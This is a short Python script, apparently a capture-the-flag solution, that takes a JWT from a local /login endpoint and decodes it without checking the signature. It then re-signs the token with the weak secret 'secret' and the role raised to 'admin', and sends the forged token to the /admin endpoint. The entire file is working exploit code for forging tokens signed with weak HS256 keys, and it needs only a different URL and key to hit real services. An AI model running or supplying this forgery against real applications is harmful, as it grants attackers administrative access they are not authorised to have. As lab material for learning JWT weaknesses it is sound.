import jwt
import requests

# Target URLs
LOGIN_URL = 'http://127.0.0.1:5000/login'
ADMIN_URL = 'http://127.0.0.1:5000/admin'

# The weak secret we are guessing
SECRET_KEY = 'secret'  # (in real challenge, player would have to guess or bruteforce)

# Step 1: Get the token from the /login endpoint
response = requests.get(LOGIN_URL)
token = response.json().get('token')

print(f"[+] Got token: {token}")

# Step 2: Decode the token (optional, for inspection)
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"[+] Decoded token: {decoded}")

# Step 3: Forge a new token with role='admin'
forged_token = jwt.encode({
    'user': 'guest',
    'role': 'admin',
    'exp': decoded['exp']  # reuse original expiration time
}, SECRET_KEY, algorithm='HS256')

print(f"[+] Forged token: {forged_token}")

# Step 4: Use the forged token to access /admin
headers = {'Authorization': forged_token}
admin_response = requests.get(ADMIN_URL, headers=headers)

print(f"[+] Admin response: {admin_response.json()}")
